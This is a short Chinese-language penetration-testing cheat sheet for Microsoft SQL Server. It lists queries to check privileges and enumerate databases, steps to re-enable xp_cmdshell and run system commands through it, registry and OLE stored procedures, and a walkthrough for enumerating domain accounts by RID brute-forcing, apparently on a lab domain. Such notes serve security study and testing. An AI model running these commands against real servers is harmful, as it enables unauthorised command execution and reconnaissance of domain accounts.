# mssql

1433端口。



具体参考https://www.freebuf.com/vuls/276814.html，下面没有列全。

## 基本语句

```mssql
exec xp_dirtree 'c:'        // 列出所有c:\文件、目录、子目录
exec xp_dirtree 'c:',1      // 只列c:\目录
exec xp_dirtree 'c:',1,1    // 列c:\目录、文件
exec xp_subdirs 'C:';       // 只列c:\目录

exists(select * from sysobjects)//判断是否为mssql
select is_srvrolemember('sysadmin') #判断是否是系统管理员 
select is_srvrolemember('db_owner') //判断是否是库权限 
select is_srvrolemember('public')   //判断是否为public权限
select db_name()//查看当前数据库
select @@version

//查询所有数据库
SELECT  Name FROM Master..SysDatabases where name not in ('master','aspcms');
//查询数据库中的所有表
select name from 数据库名.sys.all_objects where type='U' AND is_ms_shipped=0

//查询表的列
select COLUMN_NAME from 数据库名.information_schema.columns where TABLE_NAME='表名'

//如果要跨库查询
select * from 库名.dbo.表名

//查看xp_cmdshell的状态
select count(*) from master.dbo.sysobjects where xtype='x' and name='xp_cmdshell'

//开启xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE

//一些用xp_cmdshell执行命令的例子：
exec xp_cmdshell "whoami"
master..xp_cmdshell 'whoami'    //2008版上好像用不了
EXEC master..xp_cmdshell "whoami"
EXEC master.dbo.xp_cmdshell "ipconfig"


//常见存储过程
xp_cmdshell         执行系统命令
xp_fileexist        确定一个文件是否存在。
xp_getfiledetails   获得文件详细资料。
xp_dirtree          展开你需要了解的目录，获得所有目录深度。
Xp_getnetname       获得服务器名称。

注册表访问的存储过程
Xp_regwrite
Xp_regread
Xp_regdeletekey
Xp_regaddmultistring
Xp_regdeletevalue
Xp_regenumvalues
Xp_regremovemultistring

OLE自动存储过程
Sp_OACreate Sp_OADestroy Sp_OAGetErrorInfo Sp_OAGetProperty
Sp_OAMethod Sp_OASetProperty Sp_OAStop  
```







## 枚举域账户

https://blog.netspi.com/hacking-sql-server-stored-procedures-part-1-untrustworthy-databases/

https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/

https://blog.netspi.com/hacking-sql-server-stored-procedures-part-3-sqli-and-user-impersonation/

https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/





```mssql
--查询MSSQL域名 
SELECT DEFAULT_DOMAIN() --得到MEGACORP

--获取域管理员RID
select SUSER_SID('MEGACORP\Domain Admins')
--十六进制编码
select master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')) --得到0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000
--抓去前48个字节得到域的SID：
--0105000000000005150000001c00d1bcd181f1492bdfc236

--然后递增枚举RID，域的RID从500开始，500的十六进制是01F4，然后反转成F401，然后补零 F4010000，即RID:0x0105000000000005150000001c00d1bcd181f1492bdfc236F4010000

--然后枚举用户
select SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236F4010000) --得到MEGACORP\\Administrator
--递增枚举，即可。
```



